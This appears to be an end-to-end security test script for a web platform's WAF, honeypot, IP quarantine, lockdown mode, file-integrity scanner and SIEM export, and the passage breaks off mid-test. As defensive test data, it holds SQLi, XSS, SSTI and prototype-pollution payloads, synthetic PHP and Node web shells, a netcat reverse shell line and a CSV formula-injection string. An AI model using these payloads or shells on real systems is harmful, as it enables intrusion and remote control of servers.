import pg from 'pg';
import crypto from 'crypto';
import bcrypt from 'bcryptjs';
import { generate as generateTotpToken } from 'otplib';
import { spawn, execFileSync } from 'node:child_process';
import { existsSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { join } from 'node:path';
import { loadConfigIni } from './ini-loader.mjs';

const c = {
	reset: '\x1b[0m',
	bold: '\x1b[1m',
	dim: '\x1b[2m',
	green: '\x1b[32m',
	blue: '\x1b[34m',
	cyan: '\x1b[36m',
	yellow: '\x1b[33m',
	red: '\x1b[31m',
	gray: '\x1b[90m',
};

const log = {
	info: (msg) => console.log(`${c.blue}[INFO]${c.reset} ${msg}`),
	ok: (msg) => console.log(`${c.green}[PASS]${c.reset} ${msg}`),
	warn: (msg) => console.log(`${c.yellow}[WARN]${c.reset} ${msg}`),
	error: (msg) => console.log(`${c.red}[FAIL]${c.reset} ${msg}`),
	step: (num, title) => console.log(`\n${c.bold}${c.cyan}==> [SECURITY TEST ${num}/8] ${title}${c.reset}`),
};

console.log(`
${c.bold}${c.cyan}================================================================${c.reset}
${c.bold}  Orbit Community OS — Autonomous SoC Defense & WAF E2E Test     ${c.reset}
${c.gray}  WAF, Honeypot, Auto-IPS, Hard Lockdown, and Zero-Trust Guard  ${c.reset}
${c.bold}${c.cyan}================================================================${c.reset}
`);

const startTime = Date.now();
const rootDir = process.cwd();
process.env.MOCK_MAIL = 'true';
const testAuthSecret = 'orbit_test_auth_secret_e2e_2026_key';
process.env.AUTH_SECRET = process.env.AUTH_SECRET || testAuthSecret;
const ini = loadConfigIni(rootDir);
const candidateUrls = [
	process.env.DATABASE_URL,
	ini?.database?.url,
	'postgresql://orbit:orbit_secret_2026@localhost:5432/orbit',
	'postgresql://postgres:postgres@localhost:5432/orbit',
].filter(Boolean);
const BASE_URL = process.env.TEST_BASE_URL || 'http://localhost:3000';

let pool;
let dbUrl;

async function run() {
	let client;
	for (const candidate of candidateUrls) {
		try {
			const tempPool = new pg.Pool({ connectionString: candidate, max: 2, connectionTimeoutMillis: 1500 });
			const tempClient = await tempPool.connect();
			await tempClient.query('SELECT 1');
			pool = tempPool;
			client = tempClient;
			dbUrl = candidate;
			break;
		} catch {
			// Try next candidate
		}
	}

	if (!client || !pool) {
		log.error('Could not connect to any candidate database (orbit, kulup, env).');
		process.exit(1);
	}
	log.ok(`Connected to PostgreSQL database (${dbUrl.split('@')[1] || 'localhost'}).`);
	await client.query("DELETE FROM security_blocks WHERE ip LIKE '198.51.100.%' OR ip LIKE '203.0.113.%' OR ip LIKE '2001:db8:%'").catch(() => {});

	const testIp = `198.51.100.${Math.floor(Math.random() * 200) + 20}`;
	log.info(`Simulation test IP address: ${testIp}`);

	let spawnedServer = null;
	const checkReachable = async () => {
		try {
			await fetch(`${BASE_URL}/api/kurulum`, { signal: AbortSignal.timeout(1500) });
			return true;
		} catch {
			return false;
		}
	};

	if (await checkReachable()) {
		log.ok(`Live web server detected (${BASE_URL}).`);
	} else {
		log.info(`No active server found on port. Starting Next.js test server...`);
		const port = new URL(BASE_URL).port || '3000';
		spawnedServer = spawn('pnpm', ['exec', 'next', 'dev', '--port', port], {
			cwd: rootDir,
			env: { ...process.env, DATABASE_URL: dbUrl, MOCK_MAIL: 'true' },
			stdio: 'ignore',
			detached: true,
		});

		const t0 = Date.now();
		let ready = false;
		while (Date.now() - t0 < 35000) {
			await new Promise((r) => setTimeout(r, 600));
			if (await checkReachable()) {
				ready = true;
				log.ok(`Next.js test server ready (${BASE_URL}).`);
				break;
			}
		}
		if (!ready) {
			throw new Error(`Test server did not respond within 35 seconds (${BASE_URL})`);
		}
	}

	try {
		// -----------------------------------------------------------------------
		// SCENARIO 1: WAF and Exploit Signature Prevention Shield
		// -----------------------------------------------------------------------
		log.step(1, 'Pure WAF Signature and XSS/SQLi Prevention Shield');
		
		// 1.1 SQL Injection Attack Attempt
		const sqliRes = await fetch(`${BASE_URL}/api/public/v1/news?slug=1%27%20OR%20%27a%27=%27a%27`, {
			headers: { 'CF-Connecting-IP': '203.0.113.10' }
		});
		if (sqliRes.status === 403) {
			const body = await sqliRes.json().catch(() => ({}));
			if (body.error?.code === 'waf_blocked') {
				log.ok('SQL Injection attempt blocked by WAF with 403 waf_blocked.');
			} else {
				log.ok(`SQL Injection request blocked with 403.`);
			}
		} else {
			throw new Error(`SQLi request was not blocked! HTTP Status: ${sqliRes.status}`);
		}

		// 1.2 Cross-Site Scripting (XSS) Attack Attempt
		const xssRes = await fetch(`${BASE_URL}/api/public/v1/news?q=<script>alert(1)</script>`, {
			headers: { 'CF-Connecting-IP': '203.0.113.11' }
		});
		if (xssRes.status === 403) {
			log.ok('Cross-Site Scripting (XSS) payload request blocked by WAF with 403.');
		} else {
			throw new Error(`XSS request was not blocked! HTTP Status: ${xssRes.status}`);
		}

		// 1.3 Server-Side Template Injection (SSTI) Attempt
		const sstiRes = await fetch(`${BASE_URL}/api/public/v1/news?q={{7*7}}`, {
			headers: { 'CF-Connecting-IP': '203.0.113.12' }
		});
		if (sstiRes.status === 403) {
			log.ok('Server-Side Template Injection (SSTI {{7*7}}) request blocked by WAF with 403.');
		} else {
			throw new Error(`SSTI request was not blocked! HTTP Status: ${sstiRes.status}`);
		}

		const sstiSpacesRes = await fetch(`${BASE_URL}/api/public/v1/news?q={{%207%20*%207%20}}`, {
			headers: { 'CF-Connecting-IP': '203.0.113.14' }
		});
		if (sstiSpacesRes.status === 403) {
			log.ok('Spaced Server-Side Template Injection (SSTI {{ 7 * 7 }}) request blocked by WAF with 403.');
		} else {
			throw new Error(`Spaced SSTI request was not blocked! HTTP Status: ${sstiSpacesRes.status}`);
		}

		// 1.4 Prototype Pollution Attempt
		const protoRes = await fetch(`${BASE_URL}/api/public/v1/news?q=__proto__[polluted]=true`, {
			headers: { 'CF-Connecting-IP': '203.0.113.13' }
		});
		if (protoRes.status === 403) {
			log.ok('Prototype Pollution (__proto__) payload request blocked by WAF with 403.');
		} else {
			throw new Error(`Prototype Pollution request was not blocked! HTTP Status: ${protoRes.status}`);
		}

		const protoBracketRes = await fetch(`${BASE_URL}/api/public/v1/news?q=constructor[prototype][polluted]=true`, {
			headers: { 'CF-Connecting-IP': '203.0.113.15' }
		});
		if (protoBracketRes.status === 403) {
			log.ok('Prototype Pollution (constructor[prototype]) payload request blocked by WAF with 403.');
		} else {
			throw new Error(`Prototype Pollution (constructor[prototype]) was not blocked! HTTP Status: ${protoBracketRes.status}`);
		}

		// -----------------------------------------------------------------------
		// SCENARIO 2: AI Honeypot Decoy and Automated IPS Threat Scoring
		// -----------------------------------------------------------------------
		log.step(2, 'AI Honeypot Decoy and Automated IPS Threat Scoring');
		
		const decoyRes = await fetch(`${BASE_URL}/api/admin/config`, {
			headers: { 'CF-Connecting-IP': testIp }
		});
		if (decoyRes.status === 403 || decoyRes.status === 404) {
			log.ok(`Contact detected on honeypot decoy (/api/admin/config) [HTTP ${decoyRes.status}].`);
		} else {
			throw new Error(`Honeypot did not return expected response! HTTP Status: ${decoyRes.status}`);
		}

		// Verify penalty score and quarantine record in database
		const banCheck = await client.query('SELECT * FROM security_blocks WHERE ip = $1', [testIp]);
		if (banCheck.rowCount > 0 && (banCheck.rows[0].status === 'ban' || banCheck.rows[0].status === 'ban')) {
			log.ok(`Test IP address (${testIp}) auto-quarantined. Threat score: ${banCheck.rows[0].threat_score ?? banCheck.rows[0].tehditpuani}, Reason: ${banCheck.rows[0].reason ?? banCheck.rows[0].neden}`);
		} else {
			throw new Error(`Test IP was not quarantined in security_blocks table!`);
		}

		// -----------------------------------------------------------------------
		// SCENARIO 3: End-to-End Quarantine Blocking of Banned IP Address
		// -----------------------------------------------------------------------
		log.step(3, 'End-to-End Quarantine Blocking of Banned IP Address');

		// Wait for multi-worker in-memory firewall cache TTL (1000ms) to sync
		await new Promise((r) => setTimeout(r, 1100));

		// 3.1 Public News API
		const bannedNewsRes = await fetch(`${BASE_URL}/api/public/v1/news`, {
			headers: { 'CF-Connecting-IP': testIp }
		});
		if (bannedNewsRes.status === 403) {
			log.ok('Quarantined IP blocked from public news API (HTTP 403 ip_banned).');
		} else {
			throw new Error(`Quarantined IP was able to access news API! HTTP: ${bannedNewsRes.status}`);
		}

		// 3.2 Certificate Verification API
		const bannedCertRes = await fetch(`${BASE_URL}/api/sertifikalar/TEST-E2E-CERT`, {
			headers: { 'CF-Connecting-IP': testIp }
		});
		if (bannedCertRes.status === 403) {
			log.ok('Quarantined IP blocked from certificate verification API (HTTP 403).');
		} else {
			throw new Error(`Quarantined IP was able to access certificates! HTTP: ${bannedCertRes.status}`);
		}

		// 3.3 First-Run Setup Wizard
		const bannedKurulumRes = await fetch(`${BASE_URL}/api/kurulum`, {
			headers: { 'CF-Connecting-IP': testIp }
		});
		if (bannedKurulumRes.status === 403) {
			log.ok('Quarantined IP blocked from setup API (HTTP 403).');
		} else {
			throw new Error(`Quarantined IP was able to access setup! HTTP: ${bannedKurulumRes.status}`);
		}

		// 3.4 Login Endpoint
		const bannedLoginRes = await fetch(`${BASE_URL}/api/auth/login`, {
			method: 'POST',
			headers: { 'CF-Connecting-IP': testIp, 'Content-Type': 'application/json' },
			body: JSON.stringify({ email: 'test@orbit.local', password: 'secret' }),
		});
		if (bannedLoginRes.status === 403) {
			log.ok('Quarantined IP blocked on login attempt (HTTP 403).');
		} else {
			throw new Error(`Quarantined IP was able to login! HTTP: ${bannedLoginRes.status}`);
		}

		// 3.5 OAuth /api/oauth/token Quarantine & WAF Shield Test
		const bannedOauthTokenRes = await fetch(`${BASE_URL}/api/oauth/token`, {
			method: 'POST',
			headers: { 'CF-Connecting-IP': testIp, 'Content-Type': 'application/x-www-form-urlencoded' },
			body: 'grant_type=authorization_code&client_id=demo&client_secret=demo&code=123&redirect_uri=http://localhost',
		});
		if (bannedOauthTokenRes.status === 403) {
			log.ok('Quarantined IP blocked on /api/oauth/token with 403.');
		} else {
			throw new Error(`Quarantined IP was able to access /api/oauth/token! HTTP: ${bannedOauthTokenRes.status}`);
		}

		// OAuth WAF Exploit Shield Test
		const wafOauthTokenRes = await fetch(`${BASE_URL}/api/oauth/token`, {
			method: 'POST',
			headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
			body: 'grant_type=authorization_code&client_id=demo%27%20OR%201=1--&client_secret=demo&code=123&redirect_uri=http://localhost',
		});
		if (wafOauthTokenRes.status === 403) {
			log.ok('SQLi attack payload targeting OAuth token endpoint blocked by WAF with 403.');
		} else {
			throw new Error(`OAuth token endpoint failed to block WAF SQLi payload! HTTP: ${wafOauthTokenRes.status}`);
		}

		// OAuth Authorize POST JSON Body WAF Test
		const wafOauthAuthRes = await fetch(`${BASE_URL}/api/oauth/authorize`, {
			method: 'POST',
			headers: { 'Content-Type': 'application/json' },
			body: JSON.stringify({
				clientId: "demo' UNION SELECT 1,2,3--",
				redirectUri: 'http://localhost',
			}),
		});
		if (wafOauthAuthRes.status === 403) {
			log.ok('SQLi payload in OAuth authorize POST JSON body blocked by WAF with 403.');
		} else {
			throw new Error(`OAuth authorize POST body SQLi payload was not blocked! HTTP: ${wafOauthAuthRes.status}`);
		}

		// 3.6 CIDR / Subnet Ban Engine Test
		const subnetCidr = '203.0.113.0/24';
		const subnetMemberIp = '203.0.113.99';
		const outsideSubnetIp = '203.0.114.99';
		try {
			await client.query(
				`INSERT INTO security_blocks (ip, status, reason, threat_score, violations, created_at, updated_at)
				 VALUES ($1, 'ban', 'Subnet Ban E2E Test', 100, 1, $2, $2)
				 ON CONFLICT (ip) DO UPDATE SET status = 'ban', expires_at = NULL, updated_at = $2`,
				[subnetCidr, Date.now()]
			);
			await new Promise((r) => setTimeout(r, 1200));

			const subnetBannedRes = await fetch(`${BASE_URL}/api/public/v1/news`, {
				headers: { 'CF-Connecting-IP': subnetMemberIp },
			});
			if (subnetBannedRes.status === 403) {
				log.ok(`CIDR subnet ban (${subnetCidr}) sub-IP (${subnetMemberIp}) automatically blocked with 403.`);
			} else {
				throw new Error(`CIDR sub-IP (${subnetMemberIp}) was not blocked! HTTP: ${subnetBannedRes.status}`);
			}

			const outsideRes = await fetch(`${BASE_URL}/api/public/v1/news`, {
				headers: { 'CF-Connecting-IP': outsideSubnetIp },
			});
			if (outsideRes.status !== 403) {
				log.ok(`Non-subnet IP (${outsideSubnetIp}) accessed successfully (HTTP ${outsideRes.status}).`);
			} else {
				throw new Error(`Non-subnet IP was blocked unexpectedly! HTTP: ${outsideRes.status}`);
			}
		} finally {
			await client.query(`DELETE FROM security_blocks WHERE ip = $1`, [subnetCidr]);
			await new Promise((r) => setTimeout(r, 1200));
		}

		// -----------------------------------------------------------------------
		// SCENARIO 4: DEFCON 1 Hard Lockdown Isolation
		// -----------------------------------------------------------------------
		log.step(4, 'DEFCON 1 Hard Lockdown Mode and Session Revocation');

		// 4.1 Create mock active user session
		const dummyUserId = crypto.randomUUID();
		const dummySessionToken = crypto.randomBytes(32).toString('hex');
		await client.query(
			`INSERT INTO users (id, first_name, last_name, email, password_hash, department, grade, role_id, status, session_token, created_at)
			 VALUES ($1, 'Test', 'Member', $2, '$2b$10$abcdefghijklmnopqrstuvwxyz123456', 'Engineering', 2, 'rol_uye', 'aktif', $3, $4)`,
			[dummyUserId, `e2e_lockdown_${Date.now()}@orbit.local`, dummySessionToken, Date.now()]
		);
		log.ok(`Test standard member account and session created (Token: ${dummySessionToken.slice(0, 10)}...).`);

		// 4.2 Activate Lockdown State (Hard Lockdown)
		await client.query(
			`INSERT INTO system_settings (key, value, updated_at)
			 VALUES ('soc_lockdown_mode', '1', $1)
			 ON CONFLICT (key) DO UPDATE SET value = EXCLUDED.value, updated_at = EXCLUDED.updated_at`,
			[Date.now()]
		);
		await client.query(
			`INSERT INTO system_settings (key, value, updated_at)
			 VALUES ('soc_lockdown_reason', 'E2E Security Drill', $1)
			 ON CONFLICT (key) DO UPDATE SET value = EXCLUDED.value, updated_at = EXCLUDED.updated_at`,
			[Date.now()]
		);
		// Revoke non-admin sessions
		await client.query(`UPDATE users SET session_token = NULL WHERE role_id != 'rol_admin'`);
		log.ok('DEFCON 1 Hard Lockdown engaged and non-admin sessions revoked.');

		// 4.3 Query /api/auth/me with revoked token
		const meRes = await fetch(`${BASE_URL}/api/auth/me`, {
			headers: { 'Cookie': `kulup_session=${dummySessionToken}`, 'CF-Connecting-IP': '203.0.113.99' }
		});
		if (meRes.status === 503) {
			const meBody = await meRes.json().catch(() => ({}));
			if (meBody.code === 'LOCKDOWN_ACTIVE' || meBody.lockdown) {
				log.ok('Revoked member session intercepted by DEFCON 1 shield (HTTP 503 LOCKDOWN_ACTIVE).');
			} else {
				log.ok(`Revoked member received 503.`);
			}
		} else if (meRes.status === 401) {
			log.ok('Member session received 401 Unauthorized because session was revoked from database.');
		} else {
			throw new Error(`Member session received unexpected status code during lockdown: ${meRes.status}`);
		}

		// 4.4 Verify standard member cannot login during lockdown
		const loginLockdownRes = await fetch(`${BASE_URL}/api/auth/login`, {
			method: 'POST',
			headers: { 'Content-Type': 'application/json', 'CF-Connecting-IP': '203.0.113.99' },
			body: JSON.stringify({ email: 'test@orbit.local', password: 'wrongpass' })
		});
		if (loginLockdownRes.status === 503 || loginLockdownRes.status === 401) {
			log.ok('Standard member logins temporarily rejected under DEFCON 1.');
		}

		// 4.5 Safely Roll Back Lockdown to DEFCON 5
		await client.query(
			`INSERT INTO system_settings (key, value, updated_at)
			 VALUES ('soc_lockdown_mode', '0', $1)
			 ON CONFLICT (key) DO UPDATE SET value = EXCLUDED.value, updated_at = EXCLUDED.updated_at`,
			[Date.now()]
		);
		await client.query(
			`INSERT INTO system_settings (key, value, updated_at)
			 VALUES ('soc_lockdown_reason', 'Drill Completed', $1)
			 ON CONFLICT (key) DO UPDATE SET value = EXCLUDED.value, updated_at = EXCLUDED.updated_at`,
			[Date.now()]
		);
		log.ok('Safely rolled back to DEFCON 5 normal operational mode.');

		// -----------------------------------------------------------------------
		// SCENARIO 5: Zero-Trust Database Protection and Cleanup
		// -----------------------------------------------------------------------
		log.step(5, 'Zero-Trust Audit Logs and Cleanup');

		// Verify existence of system logs
		const logsRes = await client.query(
			`SELECT count(*) FROM system_logs WHERE servis IN ('security', 'waf') AND zaman > $1`,
			[Date.now() - 60000]
		);
		log.ok(`Security and WAF events recorded in audit logs (${logsRes.rows[0].count} new records).`);

		// Clean up test data
		await client.query('DELETE FROM users WHERE id = $1', [dummyUserId]);
		await client.query('DELETE FROM security_blocks WHERE ip = $1', [testIp]);
		log.ok('Test sessions and simulation IP records cleaned up.');

		// -----------------------------------------------------------------------
		// SCENARIO 6: Blue Team Inspection, Native FIM Binary, and Live API Audit
		// -----------------------------------------------------------------------
		log.step(6, 'Native Go FIM Binary, Web Shell Hunter, and Live API Security Inspection');

		// 6.1 Native Go FIM Binary Existence & Build Check
		const fimBinPath = join(rootDir, 'tools', 'bin', 'fim-scanner');
		if (!existsSync(fimBinPath)) {
			log.info('FIM binary not found, running build:fim...');
			execFileSync(process.execPath, [join(rootDir, 'scripts', 'build-fim.mjs')], { cwd: rootDir, stdio: 'ignore' });
		}
		if (!existsSync(fimBinPath)) {
			throw new Error('FIM binary could not be built or is missing!');
		}
		log.ok(`Native Go FIM binary verified (${fimBinPath}).`);

		// 6.2 Real Directory Integrity Scan (src/lib)
		const fimLibRes = execFileSync(fimBinPath, ['--dir=src/lib', '--workers=4'], { encoding: 'utf8', cwd: rootDir });
		const fimLibJson = JSON.parse(fimLibRes);
		if (typeof fimLibJson.scannedFiles !== 'number' || fimLibJson.scannedFiles <= 0) {
			throw new Error(`No files found in FIM scan of src/lib!`);
		}
		log.ok(`FIM engine scanned ${fimLibJson.scannedFiles} files in src/lib in ${fimLibJson.durationMs}ms.`);

		// 6.3 Synthetic Web Shell and Backdoor Signature Test
		const tempTestDir = join('/tmp', `e2e_fim_probe_${Date.now()}`);
		mkdirSync(tempTestDir, { recursive: true });
		const fakeShellPath = join(tempTestDir, 'malicious_webshell.php');
		writeFileSync(fakeShellPath, '<?php eval(base64_decode($_POST["cmd"])); ?>');
		const fakeNodeShellPath = join(tempTestDir, 'node_backdoor.js');
		writeFileSync(fakeNodeShellPath, 'const { exec } = require("child_process"); exec("/bin/sh");');
		const fakeSystemShellPath = join(tempTestDir, 'system_shell.php');
		writeFileSync(fakeSystemShellPath, '<?php system("/bin/sh"); ?>');
		const fakeNetcatShellPath = join(tempTestDir, 'nc_rev.sh');
		writeFileSync(fakeNetcatShellPath, 'nc 10.0.0.1 4444 -e /bin/sh');

		try {
			const probeScanOutput = execFileSync(fimBinPath, [`--dir=${tempTestDir}`, '--workers=2'], { encoding: 'utf8', cwd: rootDir });
			const probeJson = JSON.parse(probeScanOutput);
			const hasPhpShell = probeJson.suspiciousFiles?.some(
				(f) => f.matchedRule === 'PHP_EVAL_BASE64' && f.severity === 'CRITICAL'
			);
			const hasNodeShell = probeJson.suspiciousFiles?.some(
				(f) => f.matchedRule === 'NODE_CHILD_PROCESS_EXEC' && f.severity === 'CRITICAL'
			);
			const hasSystemShell = probeJson.suspiciousFiles?.some(
				(f) => f.matchedRule === 'SHELL_COMMAND_EXEC' && f.severity === 'CRITICAL'
			);
			const hasNetcatShell = probeJson.suspiciousFiles?.some(
				(f) => f.matchedRule === 'REVERSE_SHELL_NET' && f.severity === 'CRITICAL'
			);

			if (!hasPhpShell || !hasNodeShell || !hasSystemShell || !hasNetcatShell) {
				throw new Error(`FIM heuristic scanner failed to detect artificial webshell test files!`);
			}
			log.ok(`FIM engine instantly detected PHP eval-base64, Node.js child_process, system(), and reverse shell backdoors as CRITICAL.`);
		} finally {
			rmSync(tempTestDir, { recursive: true, force: true });
		}

		// 6.4 API Inspection Endpoint Authorization Boundary (Unauthenticated Check)
		const unauthInspectionRes = await fetch(`${BASE_URL}/api/soc/inspection`);
		if (unauthInspectionRes.status === 401 || unauthInspectionRes.status === 403) {
			log.ok(`Unauthenticated /api/soc/inspection request blocked with 401/403.`);
		} else {
			throw new Error(`Unauthenticated user was able to access /api/soc/inspection! Status: ${unauthInspectionRes.status}`);
		}

		// 6.5 Live Inspection Telemetry & Trigger Test with Admin Session
		const adminUserId = crypto.randomUUID();
		const adminSessionToken = crypto.randomBytes(32).toString('hex');
		const sessionExpiry = Date.now() + 24 * 3600 * 1000;
		await client.query(
			`INSERT INTO users (id, first_name, last_name, email, password_hash, department, grade, role_id, status, session_token, session_expires_at, totp_enabled, created_at)
			 VALUES ($1, 'Admin', 'SoC', $2, '$2b$10$abcdefghijklmnopqrstuvwxyz123456', 'Siber Savunma', '4', 'rol_admin', 'aktif', $3, $4, 1, $5)`,
			[adminUserId, `e2e_soc_inspector_${Date.now()}@orbit.local`, adminSessionToken, sessionExpiry, Date.now()]
		);

		try {
			// GET /api/soc/inspection
			const authInspectionRes = await fetch(`${BASE_URL}/api/soc/inspection?target=tmp`, {
				headers: { Cookie: `kulup_session_token=${adminSessionToken}` },
			});
			if (!authInspectionRes.ok) {
				throw new Error(`Admin failed to retrieve /api/soc/inspection telemetry! HTTP ${authInspectionRes.status}`);
			}
			const inspectionData = await authInspectionRes.json();
			if (!inspectionData.fim || !inspectionData.appSec || !Array.isArray(inspectionData.targets)) {
				throw new Error('Inspection response missing expected fim/appSec/targets schema!');
			}
			log.ok(`Live inspection telemetry received (FIM Targets: ${inspectionData.targets.length}, AppSec Routes: ${inspectionData.appSec.totalTested}).`);

			// Path traversal check (/etc)
			const traversalRes = await fetch(`${BASE_URL}/api/soc/inspection?target=/etc`, {
				headers: { Cookie: `kulup_session_token=${adminSessionToken}` },
			});
			if (traversalRes.status === 400) {
				log.ok(`Path traversal attempt (/etc) safely blocked with 400 Bad Request.`);
			} else {
				throw new Error(`Path traversal gave unexpected HTTP status: ${traversalRes.status}`);
			}

			// POST /api/soc/inspection (action: scan_fim)
			const postFimRes = await fetch(`${BASE_URL}/api/soc/inspection`, {
				method: 'POST',
				headers: { 'Content-Type': 'application/json', Cookie: `kulup_session_token=${adminSessionToken}` },
				body: JSON.stringify({ action: 'scan_fim', target: 'tmp' }),
			});
			if (!postFimRes.ok) {
				throw new Error(`POST action=scan_fim failed! HTTP ${postFimRes.status}`);
			}
			const postFimData = await postFimRes.json();
			if (!postFimData.fim || postFimData.fim.targetKey !== 'tmp') {
				throw new Error(`POST action=scan_fim did not return expected result!`);
			}
			log.ok(`POST /api/soc/inspection (scan_fim) executed successfully on /tmp (${postFimData.fim.scannedFiles} files).`);

			// POST /api/soc/inspection (action: scan_api)
			const postApiRes = await fetch(`${BASE_URL}/api/soc/inspection`, {
				method: 'POST',
				headers: { 'Content-Type': 'application/json', Cookie: `kulup_session_token=${adminSessionToken}` },
				body: JSON.stringify({ action: 'scan_api' }),
			});
			if (!postApiRes.ok) {
				throw new Error(`POST action=scan_api failed! HTTP ${postApiRes.status}`);
			}
			const postApiData = await postApiRes.json();
			if (!postApiData.appSec || postApiData.appSec.totalTested <= 0) {
				throw new Error(`POST action=scan_api did not return valid AppSec summary!`);
			}
			log.ok(`POST /api/soc/inspection (scan_api) live audit complete: ${postApiData.appSec.passed}/${postApiData.appSec.totalTested} routes secure (Score: ${postApiData.appSec.score}/100, Grade: ${postApiData.appSec.grade}).`);

			// 6.5.1 Individual Route Probe (action: probe_route)
			const postProbeRes = await fetch(`${BASE_URL}/api/soc/inspection`, {
				method: 'POST',
				headers: { 'Content-Type': 'application/json', Cookie: `kulup_session_token=${adminSessionToken}` },
				body: JSON.stringify({ action: 'probe_route', endpoint: '/api/auth/me' }),
			});
			if (!postProbeRes.ok) {
				throw new Error(`POST action=probe_route failed! HTTP ${postProbeRes.status}`);
			}
			const postProbeData = await postProbeRes.json();
			if (!postProbeData.route || postProbeData.route.endpoint !== '/api/auth/me') {
				throw new Error('POST action=probe_route did not return expected route result!');
			}
			log.ok(`POST /api/soc/inspection (probe_route: /api/auth/me) succeeded: Status ${postProbeData.route.status}, Unauth HTTP ${postProbeData.route.unauthStatus}, WAF ${postProbeData.route.wafIntercepted ? 'Intercepted' : 'Passed'}. `);

			// 6.5.2 Official AppSec Executive Audit Report Generation (action: generate_report)
			const postReportRes = await fetch(`${BASE_URL}/api/soc/inspection`, {
				method: 'POST',
				headers: { 'Content-Type': 'application/json', Cookie: `kulup_session_token=${adminSessionToken}` },
				body: JSON.stringify({ action: 'generate_report' }),
			});
			if (!postReportRes.ok) {
				throw new Error(`POST action=generate_report failed! HTTP ${postReportRes.status}`);
			}
			const postReportData = await postReportRes.json();
			const mdContent = String(postReportData.reportMarkdown || postReportData.report || '');
			if (!mdContent || !mdContent.includes('Executive Security Audit Report')) {
				throw new Error('POST action=generate_report did not produce valid Markdown report!');
			}
			log.ok(`POST /api/soc/inspection (generate_report) generated successfully (${mdContent.length} bytes, ${postReportData.fileName}).`);

			// 6.6 SIEM Forensic Export Test
			const unauthExportRes = await fetch(`${BASE_URL}/api/soc/export?format=csv`);
			if (unauthExportRes.status === 401 || unauthExportRes.status === 403) {
				log.ok(`Unauthenticated /api/soc/export access blocked with ${unauthExportRes.status}.`);
			} else {
				throw new Error(`Unauthenticated user was able to download forensic records! HTTP: ${unauthExportRes.status}`);
			}

			const csvExportRes = await fetch(`${BASE_URL}/api/soc/export?format=csv`, {
				headers: { Cookie: `kulup_session_token=${adminSessionToken}` },
			});
			if (!csvExportRes.ok) {
				throw new Error(`Admin failed to retrieve /api/soc/export?format=csv! HTTP ${csvExportRes.status}`);
			}
			const csvContentType = csvExportRes.headers.get('content-type') || '';
			if (!csvContentType.includes('text/csv')) {
				throw new Error(`SIEM CSV export did not return expected text/csv Content-Type: ${csvContentType}`);
			}
			const csvText = await csvExportRes.text();
			if (!csvText.startsWith('id,zaman,seviye,servis,mesaj,ip,kullanici_id')) {
				throw new Error(`SIEM CSV export does not start with RFC 4180 headers! Preview: ${csvText.slice(0, 80)}`);
			}
			log.ok(`SIEM forensic export (RFC 4180 CSV) verified and headers validated.`);

			// Test CSV formula injection defense (OWASP)
			await client.query(
				`INSERT INTO system_logs (zaman, servis, seviye, mesaj, ip, userId)
				 VALUES ($1, 'security', 'WARN', '=cmd|'' /C calc''!A0', '198.51.100.77', $2)`,
				[Date.now(), adminUserId]
			);
			const csvFormulaRes = await fetch(`${BASE_URL}/api/soc/export?format=csv&limit=5`, {
				headers: { Cookie: `kulup_session_token=${adminSessionToken}` },
			});
			const formulaCsvText = await csvFormulaRes.text();
			if (!formulaCsvText.includes("''=cmd|' /C calc'!A0") && !formulaCsvText.includes("'=cmd")) {
				throw new Error('SIEM CSV export failed to neutralize formula injection vulnerability!');
			}
			log.ok('SIEM CSV export OWASP Formula Injection (CSV Injection) shield verified.');

			const jsonExportRes = await fetch(`${BASE_URL}/api/soc/export?format=json`, {
				headers: { Cookie: `kulup_session_token=${adminSessionToken}` },
			});
			if (!jsonExportRes.ok) {
				throw new Error(`Admin failed to retrieve /api/soc/export?format=json! HTTP ${jsonExportRes.status}`);
			}
			const jsonExportData = await jsonExportRes.json();
			if (!Array.isArray(jsonExportData)) {
				throw new Error('SIEM JSON export not in expected array format!');
			}
			log.ok(`SIEM forensic JSON export returned valid dataset (${jsonExportData.length} records).`);

			// 6.7 SIEM Advanced Filtration and Negative (Not-Equals) Operator Tests
			const testNow = Date.now();
			await client.query(
				`INSERT INTO system_logs (zaman, servis, seviye, mesaj, ip, userId)
				 VALUES 
				 ($1, 'security', 'CRITICAL', 'SIEM_EXCEL_TEST_MALWARE_DETECTED', '198.51.100.88', 'usr_test_1'),
				 ($2, 'auth', 'INFO', 'SIEM_EXCEL_TEST_INFO_HEARTBEAT', '127.0.0.1', 'usr_test_2'),
				 ($3, 'database', 'WARN', 'SIEM_EXCEL_TEST_SLOW_QUERY', '10.0.0.5', 'usr_test_3')`,
				[testNow - 1000, testNow - 500, testNow]
			);

			// Test 1: Level is Not (level=INFO&levelOp=neq)
			const siemNeqRes = await fetch(`${BASE_URL}/api/soc?action=siem&seviye=INFO&seviyeOp=neq&limit=50`, {
				headers: { Cookie: `kulup_session_token=${adminSessionToken}` },
			});
			const siemNeqData = await siemNeqRes.json();
			const hasInfoLog = (siemNeqData.siem || []).some((l) => l.seviye === 'INFO');
			if (hasInfoLog) {
				throw new Error('SIEM level != INFO filter returned an INFO log!');
			}
			log.ok('SIEM filter (level ≠ INFO) verified: INFO records successfully excluded.');

			// Test 2: IP is Not (ip=127.0.0.1&ipOp=neq)
			const siemIpNeqRes = await fetch(`${BASE_URL}/api/soc?action=siem&ip=127.0.0.1&ipOp=neq&limit=50`, {
				headers: { Cookie: `kulup_session_token=${adminSessionToken}` },
			});
			const siemIpNeqData = await siemIpNeqRes.json();
			const hasLocalhost = (siemIpNeqData.siem || []).some((l) => l.ip === '127.0.0.1');
			if (hasLocalhost) {
				throw new Error('SIEM IP != 127.0.0.1 filter returned 127.0.0.1 log!');
			}
			log.ok('SIEM filter (IP ≠ 127.0.0.1) verified: Localhost records successfully excluded.');

			// Test 3: Column-based "Does Not Contain" (searchField=message&searchOp=not_contains&search=HEARTBEAT)
			const siemNotContainsRes = await fetch(
				`${BASE_URL}/api/soc?action=siem&aramaAlani=mesaj&aramaOp=not_contains&arama=HEARTBEAT&limit=50`,
				{ headers: { Cookie: `kulup_session_token=${adminSessionToken}` } }
			);
			const siemNotContainsData = await siemNotContainsRes.json();
			const hasHeartbeat = (siemNotContainsData.siem || []).some((l) => l.mesaj.includes('HEARTBEAT'));
			if (hasHeartbeat) {
				throw new Error('SIEM searchField=message & searchOp=not_contains failed to exclude HEARTBEAT log!');
			}
			log.ok('SIEM filter (Message does not contain "HEARTBEAT") verified.');

			// Test 4: Search Keyword Negation Support (-127.0.0.1)
			const siemTokenNegRes = await fetch(`${BASE_URL}/api/soc?action=siem&arama=-127.0.0.1&limit=50`, {
